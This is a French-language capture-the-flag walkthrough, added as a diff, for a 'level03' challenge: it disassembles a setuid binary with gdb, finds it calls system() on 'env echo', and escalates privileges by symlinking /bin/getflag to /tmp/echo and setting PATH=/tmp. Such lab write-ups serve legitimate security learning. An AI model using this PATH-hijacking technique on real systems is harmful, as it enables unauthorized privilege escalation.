@@ -1,0 +1,35 @@
+$ ls -la
+-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+
+on a un fichier executable level03
+
+$ file level03
+level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
+
+On apprend que l on a un fichier binaire qui execute setuid et setgid
+
+$ ./level03
+Exploit me
+
+On l'analyse avec gdb:
+
+$ gdb level03
+
+$ (gdb) disas main
+...
+0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
+0x080484fe <+90>:	call   0x80483b0 <system@plt>
+...
+
+$ (gdb) x/s 0x80485e0
+0x80485e0:	 "/usr/bin/env echo Exploit me"
+On voit que la fonction system est appelée avec le parametre "/usr/bin/env echo Exploit me"
+nous allons donc creer un faux echo qui va executer getflag et creant un lien symbolique entre getflag et notre faux echo:
+
+$ ln -s /bin/getflag /tmp/echo
+
+ensuite on change la variable d'envirionement PATH pour que la fonction system aille chercher echo dans tmp et non dans bin:
+$ export PATH=/tmp
+
+puis on reexecute ./level03:
+Check flag.Here is your token :
